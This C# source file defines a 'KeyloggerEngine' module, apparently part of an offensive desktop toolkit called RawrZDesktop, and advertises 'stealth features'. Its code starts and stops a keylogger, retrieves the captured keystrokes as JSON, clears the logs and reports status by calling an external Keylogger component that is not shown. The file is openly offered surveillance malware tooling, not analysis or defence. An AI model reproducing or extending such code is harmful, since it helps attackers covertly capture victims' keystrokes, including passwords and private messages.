using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using RawrZDesktop.AdvancedModules;

namespace RawrZDesktop.Engines
{
    public class KeyloggerEngine : IEngine
    {
        public string Name => "Keylogger";
        public string Description => "Advanced keylogging with window title capture and stealth features";
        public string Version => "1.0.0";

        public async Task<EngineResult> ExecuteAsync(Dictionary<string, object> parameters)
        {
            var startTime = DateTime.UtcNow;
            
            try
            {
                var operation = parameters["operation"]?.ToString() ?? throw new ArgumentException("Operation parameter is required");
                
                switch (operation.ToLower())
                {
                    case "start":
                        return await StartKeyloggerAsync(parameters);
                    case "stop":
                        return await StopKeyloggerAsync();
                    case "get_logs":
                        return await GetKeylogsAsync();
                    case "clear_logs":
                        return await ClearKeylogsAsync();
                    case "status":
                        return await GetKeyloggerStatusAsync();
                    default:
                        return new EngineResult
                        {
                            Success = false,
                            Error = $"Unsupported operation: {operation}"
                        };
                }
            }
            catch (Exception ex)
            {
                return new EngineResult
                {
                    Success = false,
                    Error = ex.Message,
                    ProcessingTimeMs = (long)(DateTime.UtcNow - startTime).TotalMilliseconds
                };
            }
        }

        private async Task<EngineResult> StartKeyloggerAsync(Dictionary<string, object> parameters)
        {
            return await Task.Run(() =>
            {
                try
                {
                    var captureWindowTitles = parameters.ContainsKey("capture_window_titles") && (bool)parameters["capture_window_titles"];
                    var captureSpecialKeys = parameters.ContainsKey("capture_special_keys") && (bool)parameters["capture_special_keys"];
                    var stealthMode = parameters.ContainsKey("stealth_mode") && (bool)parameters["stealth_mode"];
                    
                    Keylogger.StartKeylogger();
                    
                    return new EngineResult
                    {
                        Success = true,
                        Data = System.Text.Encoding.UTF8.GetBytes("Keylogger started successfully"),
                        Metadata = new Dictionary<string, object>
                        {
                            ["operation"] = "start",
                            ["capture_window_titles"] = captureWindowTitles,
                            ["capture_special_keys"] = captureSpecialKeys,
                            ["stealth_mode"] = stealthMode,
                            ["status"] = "running"
                        }
                    };
                }
                catch (Exception ex)
                {
                    return new EngineResult
                    {
                        Success = false,
                        Error = ex.Message
                    };
                }
            });
        }

        private async Task<EngineResult> StopKeyloggerAsync()
        {
            return await Task.Run(() =>
            {
                try
                {
                    Keylogger.StopKeylogger();
                    
                    return new EngineResult
                    {
                        Success = true,
                        Data = System.Text.Encoding.UTF8.GetBytes("Keylogger stopped successfully"),
                        Metadata = new Dictionary<string, object>
                        {
                            ["operation"] = "stop",
                            ["status"] = "stopped"
                        }
                    };
                }
                catch (Exception ex)
                {
                    return new EngineResult
                    {
                        Success = false,
                        Error = ex.Message
                    };
                }
            });
        }

        private async Task<EngineResult> GetKeylogsAsync()
        {
            return await Task.Run(() =>
            {
                try
                {
                    var logs = Keylogger.GetCurrentKeylog();
                    var logsJson = System.Text.Json.JsonSerializer.Serialize(new { content = logs, length = logs.Length });
                    
                    return new EngineResult
                    {
                        Success = true,
                        Data = System.Text.Encoding.UTF8.GetBytes(logsJson),
                        Metadata = new Dictionary<string, object>
                        {
                            ["operation"] = "get_logs",
                            ["log_count"] = logs.Length,
                            ["total_keystrokes"] = logs.Length
                        }
                    };
                }
                catch (Exception ex)
                {
                    return new EngineResult
                    {
                        Success = false,
                        Error = ex.Message
                    };
                }
            });
        }

        private async Task<EngineResult> ClearKeylogsAsync()
        {
            return await Task.Run(() =>
            {
                try
                {
                    Keylogger.ClearKeylog();
                    
                    return new EngineResult
                    {
                        Success = true,
                        Data = System.Text.Encoding.UTF8.GetBytes("Keylogs cleared successfully"),
                        Metadata = new Dictionary<string, object>
                        {
                            ["operation"] = "clear_logs",
                            ["status"] = "cleared"
                        }
                    };
                }
                catch (Exception ex)
                {
                    return new EngineResult
                    {
                        Success = false,
                        Error = ex.Message
                    };
                }
            });
        }

        private async Task<EngineResult> GetKeyloggerStatusAsync()
        {
            return await Task.Run(() =>
            {
                try
                {
                    var isRunning = Keylogger.IsRunning;
                    var logCount = Keylogger.GetKeylogCount();
                    
                    var status = new Dictionary<string, object>
                    {
                        ["is_running"] = isRunning,
                        ["log_count"] = logCount,
                        ["status"] = isRunning ? "running" : "stopped"
                    };
                    
                    return new EngineResult
                    {
                        Success = true,
                        Data = System.Text.Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(status)),
                        Metadata = new Dictionary<string, object>
                        {
                            ["operation"] = "status",
                            ["is_running"] = isRunning,
                            ["log_count"] = logCount
                        }
                    };
                }
                catch (Exception ex)
                {
                    return new EngineResult
                    {
                        Success = false,
                        Error = ex.Message
                    };
                }
            });
        }
    }
}
